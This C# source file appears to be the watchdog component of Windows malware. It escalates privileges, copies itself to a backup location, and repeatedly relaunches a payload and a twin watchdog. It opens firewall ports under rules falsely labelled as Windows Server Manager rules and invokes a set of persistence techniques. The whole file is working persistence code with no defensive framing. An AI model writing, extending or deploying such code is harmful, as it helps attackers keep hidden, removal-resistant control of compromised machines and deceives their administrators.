using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

class Watchdog
{
    static void Main()
    {
        using var mutex = new Mutex(false, "Global\\" + Config.PrimaryWatchdogMutexName, out bool isNewInstance);
        watchdogHelper.EnsureHighestPriv(isNewInstance);
        RunWatchdogLoop();
    }

    private static void RunWatchdogLoop()
    {
        try
        {
            string secondaryPath = Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName);
            if (!File.Exists(secondaryPath))
                File.Copy(Config.PrimaryWatchdogFullPath, secondaryPath, overwrite: false);
        }
        catch (Exception e)
        {
            watchdogHelper.Log($"[INIT ERROR] {e.Message}");
        }

        while (true)
        {
            try
            {
                watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
                watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
                watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);

                foreach (int port in Config.PortsToKeepOpen)
                    Persistence.EnsureFirewallRule((ushort)port, $"Windows Server Manager Automated Firewall Rule - {port}");

                watchdogHelper.VerifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
                watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);

                watchdogHelper.VerifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
                watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);

                Persistence.RunAllTechniques();

                watchdogHelper.Log("Watchdog completed iteration successfully.");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"[LOOP ERROR] {ex.Message}");
            }

            Thread.Sleep(Config.sleepTime);
        }
    }
}
